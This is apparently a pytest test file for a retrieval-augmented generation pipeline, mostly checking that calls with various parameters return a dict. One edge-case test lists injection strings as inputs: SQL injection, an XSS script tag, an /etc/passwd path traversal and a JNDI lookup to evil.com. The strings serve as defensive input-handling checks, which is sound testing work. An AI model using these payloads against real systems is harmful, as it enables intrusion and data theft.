"""
Focused tests for the unified RAG pipeline - the only pipeline in production use.

This module tests the actual unified_rag_pipeline function that handles all
RAG requests in production. No testing of deprecated or unused code.
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from typing import Dict, Any

from tldw_Server_API.app.core.RAG.rag_service.unified_pipeline import unified_rag_pipeline

# ========================================================================
# Unit Tests - Minimal mocking, focus on pipeline logic
# ========================================================================

class TestUnifiedPipelineUnit:
    """Unit tests for the unified RAG pipeline."""
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_minimal_query_execution(self):
        """Test the most basic query execution with minimal parameters."""
        # This represents 90% of actual usage
        # Mock the dependencies that unified_rag_pipeline uses
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            # Call the actual function with minimal params
            result = await unified_rag_pipeline(
                query="What is RAG?",
                top_k=5
            )
            
            # Verify basic structure
            assert isinstance(result, dict)
            assert "query" in result
            assert result["query"] == "What is RAG?"
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_query_with_common_parameters(self):
        """Test query with parameters commonly used in production."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            result = await unified_rag_pipeline(
                query="Explain machine learning",
                top_k=10,
                enable_cache=True,
                enable_reranking=True,
                temperature=0.7
            )
            
            assert isinstance(result, dict)
            assert "query" in result
    
    @pytest.mark.unit
    @pytest.mark.asyncio 
    async def test_empty_query_handling(self):
        """Test handling of empty or invalid queries."""
        # Empty query should be handled gracefully
        result = await unified_rag_pipeline(query="")
        
        assert isinstance(result, dict)
        # Should handle empty query without crashing
        assert "query" in result
        assert result["query"] == ""
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_sources_parameter(self):
        """Test different data source configurations."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            # Test with specific sources
            result = await unified_rag_pipeline(
                query="test query",
                sources=["media_db", "notes"]
            )
            
            assert isinstance(result, dict)

# ========================================================================
# Integration Tests - No mocking, use real MediaDatabase
# ========================================================================

class TestUnifiedPipelineIntegration:
    """Integration tests using real components."""
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_pipeline_with_real_database(self, populated_media_db):
        """Test pipeline with actual MediaDatabase."""
        # Pass the real database to the pipeline
        result = await unified_rag_pipeline(
            query="What is RAG?",
            sources=["media_db"],
            top_k=5,
            # Pass the database instance if the pipeline accepts it
            # database=populated_media_db
        )
        
        assert isinstance(result, dict)
        assert "query" in result
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_end_to_end_retrieval(self, populated_media_db):
        """Test complete retrieval flow with real database."""
        result = await unified_rag_pipeline(
            query="vector databases",
            sources=["media_db"],
            top_k=10
        )
        
        assert isinstance(result, dict)
        # Check if documents were retrieved
        if "documents" in result:
            assert isinstance(result["documents"], list)
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    @pytest.mark.slow
    async def test_concurrent_requests(self, populated_media_db):
        """Test handling multiple concurrent requests."""
        import asyncio
        
        queries = ["RAG", "vector", "retrieval", "generation", "database"]
        
        # Create concurrent tasks
        tasks = [
            unified_rag_pipeline(query=q, sources=["media_db"], top_k=5)
            for q in queries
        ]
        
        # Execute concurrently
        results = await asyncio.gather(*tasks)
        
        assert len(results) == len(queries)
        for result in results:
            assert isinstance(result, dict)

# ========================================================================
# Common Production Scenarios
# ========================================================================

class TestProductionScenarios:
    """Test scenarios that reflect actual production usage."""
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_chatbot_query_pattern(self):
        """Test typical chatbot interaction pattern."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            result = await unified_rag_pipeline(
                query="Follow up on the previous question",
                sources=["media_db", "chats"],
                top_k=5,
                temperature=0.7,
                user_id="test_user_123"
            )
            
            assert isinstance(result, dict)
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_research_query_pattern(self):
        """Test research/analysis query pattern."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            result = await unified_rag_pipeline(
                query="What are the latest developments in RAG systems?",
                sources=["media_db", "notes"],
                top_k=20,
                enable_citations=True,
                enable_reranking=True,
                min_relevance_score=0.7
            )
            
            assert isinstance(result, dict)
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_api_endpoint_pattern(self):
        """Test pattern used by API endpoints."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            # Simulate API request parameters
            api_request = {
                "query": "User question from API",
                "top_k": 10,
                "user_id": "api_user_123"
            }
            
            result = await unified_rag_pipeline(**api_request)
            
            assert isinstance(result, dict)

# ========================================================================
# Performance and Edge Cases
# ========================================================================

class TestPerformanceAndEdgeCases:
    """Test performance characteristics and edge cases."""
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_large_result_set_handling(self):
        """Test handling of large number of retrieved documents."""
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            # Simulate large retrieval result
            large_docs = [{"id": i, "content": f"Doc {i}"} for i in range(100)]
            mock_retriever_instance.retrieve.return_value = large_docs
            mock_retriever.return_value = mock_retriever_instance
            
            result = await unified_rag_pipeline(
                query="broad search query",
                top_k=100
            )
            
            assert isinstance(result, dict)
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_special_characters_in_query(self):
        """Test handling of special characters and injection attempts."""
        dangerous_queries = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com}"
        ]
        
        for query in dangerous_queries:
            # Should handle safely without throwing exceptions
            result = await unified_rag_pipeline(query=query)
            assert isinstance(result, dict)
            assert "query" in result
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_various_parameter_combinations(self):
        """Test various parameter combinations used in production."""
        test_cases = [
            # Minimal
            {"query": "test"},
            # With sources
            {"query": "test", "sources": ["media_db"]},
            # With retrieval params
            {"query": "test", "top_k": 20, "min_relevance_score": 0.5},
            # With generation params
            {"query": "test", "temperature": 0.9, "max_tokens": 500},
            # With features
            {"query": "test", "enable_cache": True, "enable_reranking": True},
            # With all
            {
                "query": "test",
                "sources": ["media_db", "notes"],
                "top_k": 15,
                "temperature": 0.7,
                "enable_cache": True,
                "enable_reranking": True,
                "enable_citations": True
            }
        ]
        
        with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MediaDatabaseRetriever') as mock_retriever:
            mock_retriever_instance = MagicMock()
            mock_retriever_instance.retrieve.return_value = []
            mock_retriever.return_value = mock_retriever_instance
            
            for params in test_cases:
                result = await unified_rag_pipeline(**params)
                assert isinstance(result, dict)
                assert "query" in result